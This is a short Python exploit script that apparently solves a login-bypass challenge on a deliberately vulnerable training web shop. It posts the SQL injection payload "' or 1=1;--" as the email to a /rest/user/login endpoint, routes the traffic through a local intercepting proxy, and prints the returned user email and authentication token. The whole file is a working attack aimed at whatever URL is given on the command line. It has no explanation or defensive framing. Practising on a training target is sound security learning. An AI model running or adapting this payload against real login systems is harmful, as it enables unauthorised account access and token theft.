import requests
import sys
import urllib3
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def login_as_admin(url):
    uri = "/rest/user/login"
    data = {'email': "' or 1=1;--", 'password': 10001}
    r = requests.post(url + uri, data=data, verify=False, proxies=proxies)
    if "authentication" in r.text:
        json_array = json.loads(r.text)
        print("[+] Loged In Successfull!")
        print("Email : %s" % json_array["authentication"]["umail"])
        print("Bid : %s" % json_array["authentication"]["bid"])
        print("Token : %s" % json_array["authentication"]["token"])
        return True
    else:
        return False
    print(r.text)

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url> " % sys.argv[0])
        print('[-] Example: %s www.example.com ' % sys.argv[0])
        sys.exit(-1)

    if(login_as_admin(url)):
        print("[+] Challange Completed")
    else:
        print("[+] Sorry Something went wrong!")
